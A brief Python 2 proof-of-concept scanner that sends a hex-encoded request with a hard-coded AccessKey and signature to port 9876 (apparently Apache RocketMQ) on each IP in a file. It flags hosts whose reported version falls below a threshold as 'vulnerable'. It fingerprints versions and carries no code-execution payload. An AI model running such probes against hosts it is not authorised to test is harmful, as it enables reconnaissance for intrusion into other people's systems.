import socket
import re

def read_ips():
    file = 'ips.txt'
    urls = []
    with open(file,'r') as f:
        url = f.readline()
        while url:
            urls.append(url.replace('\n','').replace('\r',''))
            url = f.readline()
    return urls

def poc(ip,port=9876):
    payload = '000000d0000000b27B22636F6465223A3331382C226578744669656C6473223A7B224163636573734B6579223A22726F636B65746D7132222C225369676E6174757265223A2263474A6A713146424D2B3455426C52734E444E746B3055396E44303D227D2C22666C6167223A302C226C616E6775616765223A224A415641222C226F7061717565223A302C2273657269616C697A655479706543757272656E74525043223A224A534F4E222C2276657273696F6E223A3433357D746869735F69735F6B65793D746869735F69735F76616C75650A'
    payload = payload.decode('hex')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(payload)
    response = s.recv(1024)
    pattern = re.compile(r'"version":(0|[1-9]\d{0,2}|4[0-2]\d|43[0-4])')
    match = pattern.search(response)
    if match:
        print ip + " is vulnerable! Version: " + match.group(1)
    else:
        print ip + " is not vulnerable"

if __name__ == '__main__':
    urls = read_ips()
    for url in urls:
        print(url)
        poc(url)